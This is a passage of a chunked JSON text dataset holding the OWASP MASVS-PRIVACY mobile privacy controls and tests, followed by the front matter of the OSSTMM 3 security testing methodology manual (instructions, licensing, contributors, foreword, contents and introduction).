      "doc_id": "Hack the Box - sample-penetration-testing-report-template",
      "chunk_id": 16
    }
  },
  {
    "text": "mas.owasp.org Closed for comments on the 30th of November 2023. Thank you for contributing! - The OWASP MAS team - Introduction Mobile applications frequently access sensitive user data to deliver their core functionalities. This data ranges from personally identifiable information (PII), health metrics, location data, to device identifiers. Mobile devices are a constant companion to users, always connected, and equipped with numerous sensors—including cameras, microphones, GPS and BLE—that generate data capable of inferring user behavior and even identifying individuals. The landscape is further complicated by advanced tracking techniques, the integration of third-party SDKs, and a heightened awareness of privacy issues among users and regulators. As a response, there's a growing trend towards on-device processing to keep user data localized and more secure. It's crucial to protect this data both to gain the trust of users and to comply with global privacy regulations, such as the General Data Protection Regulation (GDPR) in Europe, the Children's Online Privacy Protection Rule (COPPA) and the California Consumer Privacy Act (CCPA) in the U.S., and similar legislation being considered by governments and regulators around the world. With data becoming a valuable asset for many businesses, apps frequently incorporate third-party tools, such as Software Development Kits (SDKs), to analyze user activity or display ads. These tools can sometimes collect and share data with other companies, often without the clear knowledge or consent of the user. Beyond that, many of these third-party tools monetize the collected data by building services on top of it. They can also create separate data intelligence offerings, such as analytics databases, further enriching their own ecosystem at the expense of user privacy. While making sure the app handles data securely—ensuring its confidentiality, integrity, and availability—is a basic step for an effective data protection strategy (addressed by other categories of the current OWASP Mobile Application Security Verification Standard (MASVS) such as MASVS-STORAGE, MASVS-CRYPTO, or MASVS-NETWORKING), it's distinct from the broader concept of data privacy. Data security focuses on safeguarding data from unauthorized access, while data privacy emphasizes the rights of users and how data is collected, processed, stored, and shared. This category takes the OWASP MASVS a step further, looking deeper into the challenges of adding\\nused, stored, and shared in a way that respects user privacy and conforms to best practices. It does so by following a “privacy by design and by default” approach, accentuating core principles like data minimization, unlinkability, transparency, and intervenability. Scope The main goal of MASVS-PRIVACY is to provide a baseline for user privacy. It is not intended to cover all aspects of user privacy, especially when other standards and regulations such as ENISA or the GDPR already do that. We focus on the app itself, looking at what can be tested using information that's publicly available or found within the app through methods like static or dynamic analysis. While some associated tests can be automated, others necessitate manual intervention due to the nuanced nature of privacy. For example, if an app collects data that it didn't mention in",
    "metadata": {
      "doc_id": "MASVS-PRIVACY",
      "chunk_id": 0
    }
  },
  {
    "text": "can be tested using information that's publicly available or found within the app through methods like static or dynamic analysis. While some associated tests can be automated, others necessitate manual intervention due to the nuanced nature of privacy. For example, if an app collects data that it didn't mention in the app store or its privacy policy, it takes careful manual checking to spot this. Note on \"Data Collection and Sharing\" For the MASTG tests, we treat \"Collect\" and \"Share\" in a unified manner. This means that whether the app is sending data to another server or transferring it to another app on the device, we view it as data that's potentially leaving the user's control. Validating what happens to the data on remote endpoints is challenging and often not feasible due to access restrictions and the dynamic nature of server-side operations. Therefore, this issue is outside of the scope of the MASVS.\\nImportant Disclaimer MASVS-PRIVACY is not intended to serve as an exhaustive or exclusive reference. While it provides valuable guidance on app-centric privacy considerations, it should never replace comprehensive assessments, such as a Data Protection Impact Assessment (DPIA) mandated by the General Data Protection Regulation (GDPR) or other pertinent legal and regulatory frameworks. Stakeholders are strongly advised to undertake a holistic approach to privacy, integrating MASVS-PRIVACY insights with broader assessments to ensure comprehensive data protection compliance. Given the specialized nature of privacy regulations and the complexity of data protection, these assessments are best conducted by privacy experts rather than security experts. References & Related work: - OWASP MASTG - Mobile App User Privacy Protection - General Data Protection Regulation (GDPR) - Children's Online Privacy Protection Rule (COPPA) - California Consumer Privacy Act (CCPA) - ENISA - Privacy and data protection in mobile applications - IEEE - Engineering Privacy in Smartphone Apps: A Technical Guideline Catalog for App Developers - Google - Privacy best practices - Google - Provide information for Google Play's Data safety section - Apple - User privacy and data use - Apple - App privacy details on the App Store\\nControls MASVS-PRIVACY-1 The app minimizes access to sensitive data and resources. Apps should only request access to the data they absolutely need for their functionality and always with informed consent from the user. This control ensures that apps practice data minimization and restricts access control, reducing the potential impact of data breaches or leaks. Furthermore, apps should share data with third parties only when necessary, and this should include enforcing that third-party SDKs operate based on user consent, not by default or without it. Apps should prevent third-party SDKs from ignoring consent signals or from collecting data before consent is confirmed. Additionally, apps should be aware of the 'supply chain' of SDKs they incorporate, ensuring that no data is unnecessarily passed down their chain of dependencies. This end-to-end responsibility for data aligns with recent SBOM regulatory requirements, making apps more accountable for their data practices. MASVS-PRIVACY-2 The app prevents identification of the user. Protecting user identity is",
    "metadata": {
      "doc_id": "MASVS-PRIVACY",
      "chunk_id": 1
    }
  },
  {
    "text": "the 'supply chain' of SDKs they incorporate, ensuring that no data is unnecessarily passed down their chain of dependencies. This end-to-end responsibility for data aligns with recent SBOM regulatory requirements, making apps more accountable for their data practices. MASVS-PRIVACY-2 The app prevents identification of the user. Protecting user identity is crucial. This control emphasizes the use of unlinkability techniques like data abstraction, anonymization and pseudonymization to prevent user identification and tracking. Another key aspect addressed by this control is to establish technical barriers when employing complex 'fingerprint-like' signals (e.g. device IDs, IP addresses, behavioral patterns) for specific purposes. For instance, a fingerprint used for fraud detection should be isolated and not repurposed for audience measurement in an analytics SDK. This ensures that each data stream serves its intended function without risking user privacy.\\nMASVS-PRIVACY-3 The app is transparent about data collection and usage. Users have the right to know how their data is being used. This control ensures that apps provide clear information about data collection, storage, and sharing practices, including any behavior a user wouldn't reasonably expect, such as background data collection. Apps should also adhere to platform guidelines on data declarations. MASVS-PRIVACY-4 The app offers user control over their data. Users should have control over their data. This control ensures that apps provide mechanisms for users to manage, delete, and modify their data, and change privacy settings as needed (e.g. to revoke consent). Additionally, apps should re-prompt for consent and update their transparency disclosures when they require more data than initially specified.\\nTests In privacy testing, much like with security, the specific context and use case play a big role. While some tests might not show an outright violation, they're designed to provide clear and relevant evidence. This ensures that a reviewer can make a well-informed decision about potential issues. A prerequisite for privacy testing with the MASTG, is to clearly identify data considered sensitive in the context of the mobile app and to understand how both the first-party and any third-party partners utilize each type of data. For instance, if your app gathers an email address for user authentication and to tailor their experience, that touches on both App Functionality and Product Personalization. To get a clearer picture of these nuances, it's a good idea to refer to resources like Apple's App Privacy Details and Google Play's Data Usage Guidelines. MASVS-PRIVACY-1: The app minimizes access to sensitive data and resources. ● Validate Data Access Scope Description: Ensure the app only accesses data essential for its functionality. - Ensure metadata with data protection relevance is removed when using device sensors (e.g. camera, microphone). - Erase personal data as soon as its purpose is fulfilled. ● Permission Management Description: Ensure only necessary permissions are requested when they are really needed. - Review permissions required by the app. - Review permissions required by third-party libraries and SDKs. - Use privacy-friendly APIs provided by the platform as alternatives to permissions (e.g. use the Photo Picker API instead of the storage permission; when pairing",
    "metadata": {
      "doc_id": "MASVS-PRIVACY",
      "chunk_id": 2
    }
  },
  {
    "text": "necessary permissions are requested when they are really needed. - Review permissions required by the app. - Review permissions required by third-party libraries and SDKs. - Use privacy-friendly APIs provided by the platform as alternatives to permissions (e.g. use the Photo Picker API instead of the storage permission; when pairing a device with BLE don’t ask for location; if location is needed, ask for coarse location). - Avoid platform-signed permissions when possible. - Confirm permissions are requested contextually (e.g., accessing the camera when taking a photo) and not just at app startup. - E.g. list permissions requested at app startup vs later. - Trace APIs that require permission usage. If possible, trace when the app accesses protected resources (from the OS side), the same way that the Privacy Dashboard an android and the Privacy Report does on iOS. - Check if permissions are revoked when no longer needed.\\nMASVS-PRIVACY-2: The app prevents identification of the user. ● Anonymization and Pseudonymisation Measures Description: Ensure techniques like anonymisation and pseudonymisation are implemented to prevent user identification. - Stripping data of any direct identifiers, such as user ID or name, before server-side collection. - Manipulating data to break the linkage and prevent re-linkage to real-world identities. - Check for use of Private (Information) Retrieval protocols and OHTTP (Oblivious HTTP). ● Identifier Management Review Description: Avoid using identifiers that are unique, or probabilistically unique. Instead, opt for identifiers that can be reset, except for user safety purposes when there are no alternative methods available. If you use advertising IDs, make sure they are only used for advertising purposes. - Only use an advertising ID for user profiling or ad-serving use cases. - For non-ad-serving use cases, use a privately stored globally-unique ID (GUID), which is app-scoped. - Check for identifiers generated using device or network data for the purpose of uniquely identifying a device. - Use the secure settings Android ID (SSAID) to share state between the apps that you own without requiring the user to sign in to an account (Android). MASVS-PRIVACY-3: The app is transparent about data collection and usage. ● Consent Management and User Awareness Description: Obtain explicit user consent before accessing sensors or local data. - Check for informative notifications or prompts. - Review purpose strings explaining data access needs. ● Data Collection and Sharing Description: Ensure sensitive data isn't shared with third parties unless necessary and users are informed both from the app and third-party code. - Ensure adherence to platform guidelines on data declarations. - Review data sent to app servers. - Review data sent to trackers. - Prevent data exchange between apps unless explicitly specified or chosen by the user. - Ensure local data processing mechanisms are prioritized (e.g. iOS on-device processing or Android On-Device Machine Learning and Private Compute Services). - Provide the user with a list of each third party with whom information about the user is shared, identify the categories of data shared with each third party, and provide links to those parties.\\n● Privacy Policy",
    "metadata": {
      "doc_id": "MASVS-PRIVACY",
      "chunk_id": 3
    }
  },
  {
    "text": "(e.g. iOS on-device processing or Android On-Device Machine Learning and Private Compute Services). - Provide the user with a list of each third party with whom information about the user is shared, identify the categories of data shared with each third party, and provide links to those parties.\\n● Privacy Policy Validation Description: Ensure a privacy policy is provided. - Check if a URL for the app's privacy policy is provided in the app store and the app itself. - Check that users are informed about data flow, third-party sharing, protection measures, and their data rights. - Check privacy policy declarations and compare with app actual behavior. ● App Store Declaration Consistency Description: Compare store declarations with the app's privacy policy and actual behavior. - Check store declarations and compare with privacy policy. - Check store declarations and compare with app actual behavior. MASVS-PRIVACY-4: The app offers user control over their data. ● Data Management Mechanisms Description: Ensure mechanisms are in place for users to delete all their data and modify privacy settings with granularity. - Offer mechanisms to delete all user data. - Allow users to modify privacy settings with granularity and revert to default settings. MAS-P - Baseline Privacy Profile The MAS-P profile establishes a foundational set of practices mobile apps should comply with to safeguard users' personally identifiable information (PII) and ensure compliance with prevailing data protection regulations. MAS-P serves as a baseline for privacy and is intended to work cohesively, and in some cases even overlap, with other OWASP MAS profiles, such as MAS-L1 and MAS-L2, ensuring a holistic approach to both security and privacy.",
    "metadata": {
      "doc_id": "MASVS-PRIVACY",
      "chunk_id": 4
    }
  },
  {
    "text": "\\nDesigned for e-book readers or double-sided printing.\\nThis manual provides test cases that result in verified facts. These facts provide actionable information that can measurably improve your operational security. By using the OSSTMM you no longer have to rely on general best practices, anecdotal evidence, or superstitions because you will have verified information specific to your needs on which to base your security decisions. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 1\\nInstructions This is a methodology to test the operational security of physical locations, human interactions, and all forms of communications such as wireless, wired, analog, and digital. Those who want to jump right into testing while using it may find the following quick-start information helpful. Quick Start To start making an OSSTMM test you will need to track what you test (the targets), how you test them (the parts of the targets tested and not the tools or techniques used), the types of controls discovered, and what you did not test (targets and parts of the targets). Then you may conduct the test as you are accustomed to with the objective of being able to answer the questions in the Security Test Audit Report (STAR) available at the end of this manual or as its own document. The STAR gives the specific test information on the state of the scope for the benefits of having a clear statement of the security metrics and details for comparisons with previous security tests or industry test averages. More details on the required information for the STAR is available throughout this manual and can be referenced as needed. As you may see, taking this approach means that very little time is required in addition to a standard test and the formalization of the report. It has been reported that this methodology actually reduces testing and reporting time due to the efficiencies introduced into the process. There should be no time or financial reason to avoid using the OSSTMM and no unreasonable restrictions are made to the tester. Upgrading from Older Versions If you are familiar with the OSSTMM 2.x series then you will find that the methodology has completely changed. The new rav provides a factual attack surface metric that is much more accurate for measuring the susceptibility to attacks. There are many other changes and enhancements as well but the primary focus has been to move away from solution-based testing which assumes specific security solutions will be found in a scope and are required for security (like a firewall). Another change you may notice is that there is now a single security testing methodology for all channels: Human, Physical, Wireless, Telecommunications, and Data Networks. The rav information from 2.x to 3.0 is incompatible. Those with early 3.0 draft rav (prior to RC 12) will require that the values be re-calculated using this final attack surface calculation which is available as a spreadsheet calculator at http://www.isecom.org/ravs. Previous OSSTMM security metrics measured risk with degradation however this version does not. Instead, the focus now",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 0
    }
  },
  {
    "text": "incompatible. Those with early 3.0 draft rav (prior to RC 12) will require that the values be re-calculated using this final attack surface calculation which is available as a spreadsheet calculator at http://www.isecom.org/ravs. Previous OSSTMM security metrics measured risk with degradation however this version does not. Instead, the focus now is on a metric for the attack surface (the exposure) of a target or scope. This allows for a factual metric that has no bias or opinion like risk does. Our intention is to eventually eliminate the use of risk in areas of security which have no set price value of an asset (like with people, personal privacy, and even fluctuating markets) in favor of trust metrics which are based completely on facts. Much of the terminology has changed in this version to provide a professional definition of that which can actually be created or developed. This is most notable in definitions for security and safety which take more specific and concrete meanings for operations within. Since so much has changed from previous versions, as this is a completely re-written methodology, we recommend you read through it once before using it. Further help is available at http://www.isecom.org. Courses to help you make thorough and proper security tests, systems, and processes are available through ISECOM and will help you get the most of the OSSTMM. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 2\\nVersion Information The current version of the Open Source Security Testing Methodology Manual (OSSTMM) is 3.02. This version of the OSSTMM ends the 2.x series. All OSSTMM versions prior to 3.0 including 3.0 release candidates (RC versions) are now obsolete. The original version was published on Monday, December 18, 2000. This current version is published on Tuesday, December 14, 2010. About this Project This project is maintained by the Institute for Security and Open Methodologies (ISECOM), developed in an open community, and subjected to peer and cross-disciplinary review. This project, like all ISECOM projects, is free from commercial and political influence. Financing for all ISECOM projects is provided through partnerships, subscriptions, certifications, licensing, and case-study-based research. ISECOM is a registered non-profit organization and established in New York, USA and in Catalonia, Spain. Local Support Regional ISECOM offices may be available in your area for language and business support. Find the ISECOM Partner in your area at http://www.isecom.org/tp. Community Support Reader evaluation of this document, suggestions for improvements, and results of its application for further study are required for further development. Contact us at http://www.isecom.org to offer research support, review, and editing assistance. Print Edition The print edition of this manual is available for purchase at the ISECOM website. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 3\\nRestrictions Any information contained within this document may not be modified or sold without the express consent of ISECOM. Commercial selling of this document or the information within this document, including the methodology applied within a tool, software, or checklist may NOT be provided without explicit permission from ISECOM. This research document",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 1
    }
  },
  {
    "text": "information contained within this document may not be modified or sold without the express consent of ISECOM. Commercial selling of this document or the information within this document, including the methodology applied within a tool, software, or checklist may NOT be provided without explicit permission from ISECOM. This research document is free to read, free to re-distribute non-commercially, and free to quote or apply in academic or commercial research, and free to use or apply in the following commercial engagements: testing, education, consulting, and research. This manual is licensed to ISECOM under Creative Commons 3.0 Attribution-NonCommercial-NoDerivs and the Open Methodology License 3.0. The ISECOM logo is an official Trademark and may not be used or reproduced commercially without consent from ISECOM. The OSSTMM hummingbird graphic is copyright Marta Barceló Jordan, licensed to ISECOM and may not be used or reproduced commercially without permission. As a collaborative, open project, the OSSTMM is not to be distributed by any means for which there is commercial gain either by itself or as part of a collection. As a standard, there may be only one, official version of the OSSTMM at any time and that version is not to be altered or forked in any way which will cause confusion as to the purpose of the original methodology. Therefore, no derivation of the OSSTMM is allowed. As a methodology, the OSSTMM is protected under the Open Methodology License 3.0 which applies the protection as that granted to Trade Secrets. However, where a Trade Secret requires sufficient effort requirements to retain a secret, the OML requires that the user make sufficient effort to be as transparent as possible about the application of the methodology. Therefore, use and application of the OSSTMM is considered as acceptance of the responsibility of the user to meet the requirements in the OML. There are no commercial restrictions on the use or application of the methodology within the OSSTMM. The OML is available at the end of this manual and at http://www.isecom.org/oml. Any and all licensing questions or requests should be directed to ISECOM. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 4\\nPrimary Developers • ISECOM ◦ Marta Barceló, Director, ISECOM Board Member ◦ Pete Herzog, Director, OSSTMM Project Lead, ISECOM Board Member Primary Contributors The following people are listed alphabetically by company. Each has been a substantial influence to the development of this OSSTMM. @Mediaservice.net, Italy ISECOM, USA Raoul Chiesa, ISECOM Board Member Robert E. Lee, ISECOM Board Member Marco Ivaldi Fabio Guasconi GCP Global, Mexico Fabrizio Sensibile Francisco Puente adMERITia GmbH, Germany KCT Data, Inc., USA Heiko Rudolph, ISECOM Board Member Kim Truett, ISECOM Board Member Aaron Brown La Salle URL, Spain Bell Canada, Canada Jaume Abella, ISECOM Board Member Rick Mitchell Lab106 & Outpost24, Netherlands Blue Secure Limited, New Zealand Cor Rosielle Richard Feist, ISECOM Board Member OneConsult GmbH, Switzerland Dreamlab Technologies Ltd., Switzerland Christoph Baumgartner, ISECOM Board Member Nick Mayencourt, ISECOM Board Member Urs B. Weber Outpost24, Sweden Adrian Gschwend Jack C. Louis Thomas Bader Creative",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 2
    }
  },
  {
    "text": "Board Member Rick Mitchell Lab106 & Outpost24, Netherlands Blue Secure Limited, New Zealand Cor Rosielle Richard Feist, ISECOM Board Member OneConsult GmbH, Switzerland Dreamlab Technologies Ltd., Switzerland Christoph Baumgartner, ISECOM Board Member Nick Mayencourt, ISECOM Board Member Urs B. Weber Outpost24, Sweden Adrian Gschwend Jack C. Louis Thomas Bader Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 5\\nContributors, Reviewers, and Assistants A huge and sincere thanks to all those who have applied their efforts to making this OSSTMM version happen. Without you, there would not have been the no-nonsense discussions that made this manual. A special thanks to Jack C. Louis (Jan 5, 1977 - March 15, 2009), a brilliant security researcher, an amazing person, and among the first ISECOM certified OPST and OPSA Trainers. We at ISECOM greatly appreciate all your efforts and hereby let them live on as a benchmark we hope inspire other security professionals to attain. Your contributions to the OSSTMM shall never be forgotten. Thank you! Contributions Review and Assistance Alberto Perrone, @Mediaservice.net, Italy Gunnar Peterson, Arctec Group, USA Martin Dion, Above Security, Canada Dieter Sarrazyn, Ascure nv., Belgium Lars Heidelberg, adMERITia GmbH, Germany Bob Davies, Bell Canada, Canada Martin Pajonk, adMERITia GmbH, Germany Josep Ruano, Capside, Spain Dru Lavigne, Carleton University, Canada Adrien de Beaupre, Canada Todd A. Jacobs, Codegnome, USA Clement Dupuis, CCCure, Canada Phil Robinson, Digital Assurance, UK Armand Puccetti, CEA, France Philipp Egli, Dreamlab Technologies Ltd., Switzerland Jose Luis Martin Mas, davinci Consulting, Spain Daniel Hulliger, Dreamlab Technologies Ltd., Switzerland Sylvie Reinhard, Dreamlab Technologies Ltd., Switzerland Simon Nussbaum, Dreamlab Technologies Ltd., Switzerland Raphaël Haberer-Proust, Dreamlab Technologies Ltd., Switzerland Sven Vetsch, Dreamlab Technologies Ltd., Switzerland Josh Zelonis, Dyad Security, USA Colby Clark, Guidance Software, USA Bora Turan, Ernst and Young, Turkey Andy Moore, Hereford InfoSec, UK Luis Ramon Garcia Solano, GCP Global, Mexico Peter Klee, IBM, Germany John Thomas Regney, Gedas, Spain Daniel Fernandez Bleda, Internet Security Auditors, Spain Mike Aiello, Goldman Sachs, USA Jay Abbott, Outpost24 / Lab106, Netherlands Dirk Kuhlmann, HP, UK Steve Armstrong, Logically Secure, UK John Rittinghouse, Hypersecurity LLC, USA Simon Wepfer, OneConsult GmbH, Switzerland Massimiliano Graziani, IISFA, Italy Manuel Krucker, OneConsult GmbH, Switzerland Jose Navarro, Indiseg, Spain Jan Alsenz, OneConsult GmbH, Switzerland Timothy Phillips, Information Assurance Solutions, USA Tobias Ellenberger, OneConsult GmbH, Switzerland Joan Ruiz, La Salle URL, Spain Shaun Copplestone, The Watchers Inc., Canada Víktu Pons i Colomer, La Salle URL, Spain Ian Latter, Pure Hacking, Australia Roman Drahtmueller, Novell, Germany Ty Miller, Pure Hacking, Australia Hernán Marcelo Racciatti, SICLABS, Argentina Jordi André i Vallverdú, La Caixa, Spain Tom Brown, RWE Shared Services IS, UK Jim Brown, Thrupoint, USA Marcel Gerardino, Sentinel, Dominican Republic Chris Griffin, ISECOM, USA Manuel Atug, SRC Security Research & Consulting GmbH, Germany Charles Le Grand, USA Torsten Duwe, SUSE, Germany Dave Lauer, USA Alexander J. Herzog, USA John Hoffoss, Minnesota State Colleges and Universities, USA Drexx Laggui, L&A Inc, Philippines Mike Mooney, USA Ruud van der Meulen, Netherlands Pablo Endres, Venezuela / Germany Chris Gatford, HackLabs, Australia Jeremy Wilde, compliancetutorial.com, UK",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 3
    }
  },
  {
    "text": "Germany Charles Le Grand, USA Torsten Duwe, SUSE, Germany Dave Lauer, USA Alexander J. Herzog, USA John Hoffoss, Minnesota State Colleges and Universities, USA Drexx Laggui, L&A Inc, Philippines Mike Mooney, USA Ruud van der Meulen, Netherlands Pablo Endres, Venezuela / Germany Chris Gatford, HackLabs, Australia Jeremy Wilde, compliancetutorial.com, UK / France Wim Remes, Belgium Rob J. Meijer, Netherlands Gary Axten, UK / Spain Mike Simpson, USA / Germany Alan Tang, UK Jason Woloz, USA John R. Moser, USA Tom O’Connor, Ireland Mike Vasquez, City of Mesa, USA Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 6\\nForeword Security verification used to require a cross-disciplinary specialist who understood security as deeply as they understood the rules, laws, underlying premise, operation, process, and technology involved. Sometime later, third party verification came from the popular notion of builder blindness that says those closest to the target will generally and usually involuntarily miss the most problems. This became the standard procedure for a while and is still widely regarded as true even though it actually means that an outsider with less knowledge of the target is supposedly more capable of understanding that target than the operator. At some point, the pendulum began to swing back the other way. Whether this happened for either efficiency or economic reasons is unclear, but it has brought about an important shift to provide the operators with security testing ability. It has led to simplified frameworks, software, checklists, tool kits, and many other ways to make security testing easy enough that anyone can do it. That’s a good thing. Unfortunately, there is no complex subject for which the simplification process is not itself complex nor the end result significantly less than the whole. This means that to make a security testing solution simple enough for non-experts to execute, the solution requires a complex back-end to collect the data according to preconceived rules. This assumes that operations always run according to design and configuration. It also assumes the solution developer has taken into account all the possibilities for where, what, and how data can be gathered. Furthermore it assumes that the data gathered can be properly sorted into a uniform format for comparison and rule-based analysis. None of those tasks are simple. Assuming that can be done, it would still require an exhaustive database of possibilities for the numerous representations of security and layers of controls to deduce security problems. While minimizing false positives through correlations based on the rules, laws, underlying premise, operation, process, and technology involved. This solution could then be able to provide a clear, concise report and metric. This solution would need to have more than just the framework, software, checklist, or toolkit which it produces; it would need a methodology. A security methodology is not a simple thing. It is the back-end of a process or solution which defines what or who is tested as well as when and where. It must take a complex process and reduce it into elemental processes and sufficiently explain",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 4
    }
  },
  {
    "text": "it would need a methodology. A security methodology is not a simple thing. It is the back-end of a process or solution which defines what or who is tested as well as when and where. It must take a complex process and reduce it into elemental processes and sufficiently explain the components of those processes. Then the methodology must explain the tests for verifying what those elemental processes are doing while they are doing, moving, and changing. Finally, the methodology must contain metrics both to assure the methodology has been carried out correctly and to comprehend or grade the result of applying the methodology. So, making a security testing methodology is no small feat. With each new version of the OSSTMM we get closer to expressing security more satisfactorily than previous versions. It’s not that this OSSTMM 3 promotes revolutionary ideas but rather it applies many new pragmatic concepts which will improve security. We are coming ever closer to truly understanding what makes us safe and secure. For a chance of having this enlightenment, I want to thank all the contributors to the OSSTMM, the ISECOM team, all the ISECOM certified students who care about the right way to do security testing, all those teaching Hacker Highschool to the next generation, all supporters of the ISECOM projects including the ISECOM Training Partners, ISECOM Licensed Auditors, and finally my very patient and supportive wife who understands how important this is to me and to the world we need to improve. Thank you all for all your help. Pete Herzog Director, ISECOM Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 7\\nTable of Contents Instructions....................................................................................................................................................................2 Quick Start...............................................................................................................................................................2 Upgrading from Older Versions.............................................................................................................................2 Version Information.................................................................................................................................................3 About this Project....................................................................................................................................................3 Restrictions...............................................................................................................................................................4 Primary Developers.................................................................................................................................................5 Primary Contributors...............................................................................................................................................5 Contributors, Reviewers, and Assistants...............................................................................................................6 Foreword ......................................................................................................................................................................7 Introduction................................................................................................................................................................11 Purpose..................................................................................................................................................................13 Document Scope.................................................................................................................................................13 Liability....................................................................................................................................................................13 Certification and Accreditation.........................................................................................................................14 Related Projects....................................................................................................................................................17 Chapter 1 – What You Need to Know......................................................................................................................20 1.1 Security.............................................................................................................................................................23 1.2 Controls............................................................................................................................................................24 1.3 Information Assurance Objectives...............................................................................................................27 1.4 Limitations........................................................................................................................................................28 1.5 Actual Security................................................................................................................................................31 1.6 Compliance....................................................................................................................................................31 Chapter 2 – What You Need to Do..........................................................................................................................33 2.1 Defining a Security Test..................................................................................................................................33 2.2 Scope...............................................................................................................................................................34 2.3 Common Test Types.......................................................................................................................................36 2.4 Rules Of Engagement....................................................................................................................................38 2.5 The Operational Security Testing Process....................................................................................................41 2.6 Four Point Process...........................................................................................................................................43 2.7 The Trifecta......................................................................................................................................................44 2.8 Error Handling..................................................................................................................................................46 2.9 Disclosure.........................................................................................................................................................51 Chapter 3 – Security Analysis...................................................................................................................................53 3.1 Critical Security Thinking.................................................................................................................................54 3.2 Recognize the OpSec Model........................................................................................................................56 3.3 Look for Pattern Matching as a Sign of Errors..............................................................................................57 3.4 Characterize the Results................................................................................................................................57 3.5 Look for Signs of Intuition................................................................................................................................58 3.6 Transparent Reporting....................................................................................................................................59 Chapter 4 – Operational Security Metrics..............................................................................................................62 4.1 Getting to Know the Rav...............................................................................................................................63 4.2 How to Make a Rav........................................................................................................................................67 4.3 Turning Test Results into an Attack Surface Measurement........................................................................70 4.4 The Operational Security Formula................................................................................................................79 4.5 The Controls Formula......................................................................................................................................80 4.6 The Limitations Formula..................................................................................................................................83 4.7 The Actual Security Formula..........................................................................................................................85 Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 8\\nChapter 5 – Trust Analysis.........................................................................................................................................87 5.1 Understanding Trust .......................................................................................................................................87 5.2 Fallacies in Trust...............................................................................................................................................89 5.3 The Ten Trust Properties..................................................................................................................................90 5.4 The Trust Rules..................................................................................................................................................91 5.5 Applying Trust Rules to Security Testing........................................................................................................94 Chapter 6 – Work Flow..............................................................................................................................................96 6.1 Methodology Flow..........................................................................................................................................97 6.2 The Test Modules ............................................................................................................................................99",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 5
    }
  },
  {
    "text": "Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 8\\nChapter 5 – Trust Analysis.........................................................................................................................................87 5.1 Understanding Trust .......................................................................................................................................87 5.2 Fallacies in Trust...............................................................................................................................................89 5.3 The Ten Trust Properties..................................................................................................................................90 5.4 The Trust Rules..................................................................................................................................................91 5.5 Applying Trust Rules to Security Testing........................................................................................................94 Chapter 6 – Work Flow..............................................................................................................................................96 6.1 Methodology Flow..........................................................................................................................................97 6.2 The Test Modules ............................................................................................................................................99 6.3 One Methodology........................................................................................................................................103 Chapter 7 - Human Security Testing......................................................................................................................105 Chapter 8 - Physical Security Testing....................................................................................................................120 Chapter 9 - Wireless Security Testing....................................................................................................................138 Chapter 10 - Telecommunications Security Testing............................................................................................151 Chapter 11 - Data Networks Security Testing.......................................................................................................167 Chapter 12 - Compliance......................................................................................................................................185 Regulations..........................................................................................................................................................186 Chapter 13 – Reporting with the STAR...................................................................................................................192 Chapter 14 – What You Get....................................................................................................................................204 The Möbius Defense...........................................................................................................................................205 Get What We Need............................................................................................................................................206 Chapter 15 – Open Methodology License...........................................................................................................208 The OML 3............................................................................................................................................................208 Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 9\\nIn art, the end result is a thing of beauty, whereas in science, the means of reaching the end result is a thing of beauty. When a security test is an art then the result is unverifiable and that undermines the value of a test. One way to assure a security test has value is to know the test has been properly conducted. For that you need to use a formal methodology. The OSSTMM aims to be it. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 10\\nIntroduction The Open Source Security Testing Methodology Manual (OSSTMM) provides a methodology for a thorough security test, herein referred to as an OSSTMM audit. An OSSTMM audit is an accurate measurement of security at an operational level that is void of assumptions and anecdotal evidence. As a methodology it is designed to be consistent and repeatable. As an open source project, it allows for any security tester to contribute ideas for performing more accurate, actionable, and efficient security tests. Further it allows for the free dissemination of information and intellectual property. Since its start at the end of 2000, the OSSTMM quickly grew to encompass all security channels with the applied experience of thousands of reviewers. By 2005, the OSSTMM was no longer considered just a best practices framework. It had become a methodology to assure security was being done right at the operational level. As security audits became mainstream, the need for a solid methodology became critical. In 2006, the OSSTMM changed from defining tests based on solutions such as firewall tests and router tests to a standard for those who needed a reliable security test rather than just a compliance report for a specific regulation or legislation. Since environments are significantly more complex than in years past due such things as remote operations, virtualization, cloud computing, and other new infrastructure types, we can no longer think in simplistic tests meant only for desktops, servers, or routing equipment. Therefore, with version 3, the OSSTMM encompasses tests from all channels - Human, Physical, Wireless, Telecommunications, and Data Networks. This also makes it a perfectly suited for testing cloud computing, virtual infrastructures, messaging middleware, mobile communication infrastructures, high-security locations, human resources, trusted computing, and any logical processes which all",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 6
    }
  },
  {
